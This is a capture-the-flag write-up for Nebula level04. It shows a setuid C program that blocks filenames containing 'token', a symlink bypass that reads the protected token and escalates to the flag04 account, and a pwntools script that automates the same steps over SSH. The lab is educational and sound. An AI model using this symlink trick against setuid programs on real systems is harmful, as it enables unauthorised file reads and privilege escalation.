# Level04

#### Description

This level requires you to read the **token** file, but the code restricts the files that can be read. Find a way to bypass it :)

To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.

#### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));
  
  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
```

#### Solution

```bash
level04@nebula:/home/flag04$ ls -la
total 13
drwxr-x--- 2 flag04 level04   93 2011-11-20 21:52 .
drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
-rw-r--r-- 1 flag04 flag04   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag04 flag04  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag04 level04 7428 2011-11-20 21:52 flag04
-rw-r--r-- 1 flag04 flag04   675 2011-05-18 02:54 .profile
-rw------- 1 flag04 flag04    37 2011-11-20 21:52 token
level04@nebula:/home/flag04$ ./flag04

./flag04 [file to read]
level04@nebula:/home/flag04$ ./flag04 token
You may not access 'token'
```

Here's what this C binary is doing:

* Checks if you passed a filename on the command line; if not, prints usage and exits.
* If the filename contains the substring `"token"`, refuses access and exits.
* Tries to open the given file for reading.
* Reads up to 1024 bytes from the file into a buffer.
* prints the file contents, up to 1024 bytes.

So, In short it uses a simple blacklist (`strstr`) thatâ€™s easy to bypass by creating a symbolic link of token file with some other file and with a different name. So, that it will bypass that token named file filter and through that symbolic link we can read content of that token file.&#x20;

```bash
level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/file
level04@nebula:/home/flag04$ cd /tmp
level04@nebula:/tmp$ ls -la
total 0
drwxrwxrwt 6 root    root    140 2025-09-26 02:45 .
drwxr-xr-x 1 root    root    220 2025-09-26 07:09 ..
lrwxrwxrwx 1 level04 level04  18 2025-09-26 01:57 file -> /home/flag04/token
drwxrwxrwt 2 root    root     40 2025-09-26 07:09 .ICE-unix
drwxrwxrwt 2 root    root     40 2025-09-26 07:09 VMwareDnD
drwx------ 2 root    root    100 2025-09-26 07:09 vmware-root
drwxrwxrwt 2 root    root     40 2025-09-26 07:09 .X11-unix
level04@nebula:/tmp$ cd -
/home/flag04
level04@nebula:/home/flag04$ ./flag04 /tmp/file
06508b5e-8909-4f38-b630-fdb148a848a2
level04@nebula:/home/flag04$ su flag04
Password: 
sh-4.2$ id
uid=995(flag04) gid=995(flag04) groups=995(flag04)
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

#### Python Automation

```python
from pwn import *
from sys import argv, exit

# Check if IP address is provided as an argument
if len(argv) < 2:
    sys.exit("IP address not found.")

# Establishes SSH connection with target IP address
session = ssh(host=argv[1], user='level04', password='level04')

# Stores token file's data(password) in result variable and later assign it to password
result = session.run("/home/flag04/flag04 /tmp/file")
password = result.recvall().decode()
print(password)

# Starting of remote shell for switching user with su
terminal = session.shell()
terminal.recvuntil("$ ")
terminal.sendline("su flag04")
terminal.recvuntil("Password: ")
terminal.sendline(password)
terminal.interactive()
```

<figure><img src="../../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>
